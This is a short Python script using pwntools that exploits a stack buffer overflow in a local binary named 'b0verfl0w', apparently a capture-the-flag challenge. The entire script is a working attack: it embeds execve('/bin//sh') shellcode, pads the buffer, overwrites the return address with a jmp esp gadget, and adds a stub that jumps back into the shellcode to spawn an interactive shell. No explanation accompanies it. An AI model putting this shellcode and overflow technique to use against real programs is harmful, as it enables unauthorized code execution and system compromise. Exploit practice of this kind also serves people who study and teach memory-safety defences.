from pwn import *

s= process("./b0verfl0w")
sh = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
sh += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
sh += "\x0b\xcd\x80"

jmp_esp = 0x08048504

p = sh
p += 'A'*(36-len(sh))
p += p32(jmp_esp)
p += asm("sub esp,0x28;jmp esp")

s.sendline(p)
s.interactive()
